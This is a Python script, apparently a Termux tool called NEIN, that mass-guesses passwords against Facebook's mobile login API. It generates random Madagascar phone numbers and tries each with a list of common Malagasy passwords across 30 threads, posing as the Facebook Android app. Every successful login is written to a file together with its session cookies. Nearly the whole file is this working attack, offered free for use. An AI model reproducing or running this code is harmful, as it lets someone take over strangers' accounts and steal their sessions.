import getpass
import subprocess
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json

# Mot de passe pour déverrouiller le script
mot_de_passe = "ITACHI2024"

# Demander à l'utilisateur de saisir le mot de passe
saisie_mot_de_passe = getpass.getpass("Veuillez entrer le mot de passe : ")

# Vérifier si le mot de passe saisi est correct
if saisie_mot_de_passe == mot_de_passe:
    print("Mot de passe correct. Exécution de git pull...")
    # Exécuter la commande git pull
    try:
        subprocess.run(["git", "pull"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution de git pull : {e}")
        exit(1)
    print("Git pull terminé avec succès !")

#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0

#-------------logo-----------------#
logo=(f'''{B}
 _____  ___    _______   __    _____  ___   
(\"   \|"  \  /"     "| |" \  (\"   \|"  \  
|.\\   \    |(: ______) ||  | |.\\   \    | 
|: \.   \\  | \/    |   |:  | |: \.   \\  | 
|.  \    \. | // ___)_  |.  | |.  \    \. | 
|    \    \ | (:      "| /\  |\|    \    \ | 
 \___|\____\) \_______)(__\_|_)\___|\____\) 
                                            
{warna}--------------------------------------------{B}
 Owner    : CHRICE999
 TOOL NAME : NEIN
 GROUPE-FB   : [TERMUX-COMAND]
 STATUE : FREE
 Facebook : {bblue}ITACHI SQ{bblue}
 Tools    : {warna}[{M}VERSION 1.1{warna}]{warna}
--------------------------------------------{B}''')

#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')

#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)

#-------------main def------------#
def MR_ITACHI():
    clear()
    os.system('xdg-open https://facebook.com/groups/641144864016773/')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' MERCI BEAUCOUP  :)')

#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
    print(' 261=0 Madagascar : [032] [034] [038] [033]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' CLONING EN COURS ... ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' LE CLONING EST FINI ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_ITACHI()

#------------ method crack def ---------#
def method_crack(ids, passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[ITACHI-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    # Vérifier si le dossier ITACHI-IDS existe et le créer si nécessaire
                    if not os.path.exists("ITACHI-IDS"):
                        os.makedirs("ITACHI-IDS")
                    # Enregistrer dans le fichier ITACHI-OK.txt
                    with open(os.path.join("ITACHI-IDS", "ITACHI-OK.txt"), 'a') as f:
                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[ITACHI-CP] '+ids+' | '+pas+'\033[1;37m')
                # Enregistrer dans le fichier ITACHI-CP.txt
                with open(os.path.join("ITACHI-IDS", "ITACHI-CP.txt"), 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass

#-------------end----------------#
MR_ITACHI()
